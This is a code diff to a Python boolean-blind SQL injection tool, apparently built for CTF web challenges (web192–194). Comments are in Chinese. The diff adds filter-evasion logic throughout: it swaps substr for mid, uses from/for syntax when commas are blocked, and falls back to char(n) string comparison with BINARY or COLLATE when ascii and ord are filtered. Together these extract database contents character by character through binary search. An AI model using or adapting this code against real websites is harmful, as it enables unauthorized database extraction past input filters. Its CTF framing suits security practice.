@@ -42,13 +42,22 @@ class BaseOracle:
 
     def _substr_at(self, expr: str, pos: int) -> str:
         """位置 pos 起的子串表达式（外层 ascii() 取首字符码点即单字符）。
-        逗号被滤：MySQL 走 mid(x from(p))（免逗号免 for 免空格）；
-        其他方言走 substr from/for 语法。"""
-        if self.waf.is_filtered(","):
-            if self.dialect.name == "mysql":
-                return f"mid(({expr})from({pos}))"
-            return f"substr(({expr})from {pos} for 1)"
-        return f"substr(({expr}),{pos},1)"
+
+        函数选择：substr 被滤 → mid（等价函数）；逗号被滤 → from 语法
+        （web193 实测：只封 substr 不封 mid，硬编码 substr 会让盲注整条失效）。
+        """
+        fn = "substr"
+        if self.waf.is_filtered("substr") and not self.waf.is_filtered("mid"):
+            fn = "mid"
+        # 必须带长度参数：mid(x from p) 返回的是「从 p 到结尾」的后缀，
+        # 码点模式靠 ascii() 只看首字符还能蒙混，字符串比较模式会直接算错（web194）
+        if not self.waf.is_filtered(","):
+            return f"{fn}(({expr}),{pos},1)"
+        if not self.waf.is_filtered("for"):
+            return f"{fn}(({expr})from({pos})for(1))"
+        if self.dialect.name == "mysql":
+            return f"mid(({expr})from({pos}))"
+        return f"substr(({expr})from {pos})"
 
     def code_expr(self, expr: str) -> str:
         """码点函数表达式；主函数被 WAF 过滤时自动换等价函数。
@@ -291,6 +300,10 @@ class BoolOracle(BaseOracle):
         """提取 pos 位置字符；prev 为上一字符时先做游程检测（1 请求）。
         码点比较（ascii 包裹）：mid 免 for 形态返回后缀式，直接比较后缀
         会误判，码点比较对单字符/后缀两种形态都恒等于单字符相等。"""
+        if not self.code_available():
+            # 无码点函数（ascii/ord/hex 全被滤，web192）：改用字符串比较
+            # substr(x,pos,1) >= char(n)，MySQL 字符串按字典序比较，同样可二分
+            return self._char_at_cmp(expr, pos)
         if prev:
             eq = "=" if not self.waf.is_filtered("=") else " like "
             a = self._substr_at(expr, pos)
@@ -300,6 +313,37 @@ class BoolOracle(BaseOracle):
         code = self._binsearch(
             lambda m: f"{self.code_expr(self._substr_at(expr, pos))}>={m}", 32, 126)
         return chr(code)
+
+    def _char_at_cmp(self, expr: str, pos: int) -> str:
+        """字符串比较取字符（无码点函数时的兜底）。
+
+        用 char(n) 而不是引号/十六进制字面量，避免被同一套黑名单拦掉；
+        比较方向：substr >= char(mid) 单调，二分出最大满足的码点。
+        """
+        sub = self._substr_at(expr, pos)
+        # 默认排序规则是 *_ci（大小写不敏感），直接比较会把 M/m 判成等价 →
+        # 提取结果大小写全乱。用 BINARY 强制二进制比较；被滤时退回 COLLATE。
+        if not self.waf.is_filtered("binary"):
+            sub = f"binary {sub}"
+        else:
+            sub = f"{sub}collate utf8_bin"
+        lo, hi = 32, 126
+        use_char = not self.waf.is_filtered("char")
+        while lo < hi:
+            mid = (lo + hi + 1) // 2
+            if self.s.stopped:
+                raise OracleError("用户中止")
+            if use_char:
+                rhs = f"char({mid})"
+            else:
+                # char 也被滤（web194）：退到字符串字面量（引号可用时）
+                ch = chr(mid).replace("\\", "\\\\").replace("'", "\\'")
+                rhs = f"'{ch}'"
+            if self.eval_bool(f"{sub}>={rhs}"):
+                lo = mid
+            else:
+                hi = mid - 1
+        return chr(lo)
 
     def _extract_block(self, expr: str, start: int, end: int) -> str:
         """块内串行（游程复用前一位），块间并发。"""
@@ -314,8 +358,9 @@ class BoolOracle(BaseOracle):
         return "".join(out)
 
     def scalar(self, expr: str) -> str:
-        # 按方言实际使用判定（ord 被拦不影响 ascii 通道）
-        if not self.code_available() \
+        # 按方言实际使用判定（ord 被拦不影响 ascii 通道；码点全被拦时走字符串比较）
+        if (not self.code_available() and self.waf.is_filtered("char")
+                and self.waf.is_filtered("'")) \
                 or self.waf.is_filtered("length") \
                 or (self.waf.is_filtered("substr") and self.waf.is_filtered("mid")):
             raise OracleError("码点/截取/定长函数被过滤，布尔通道不可用")
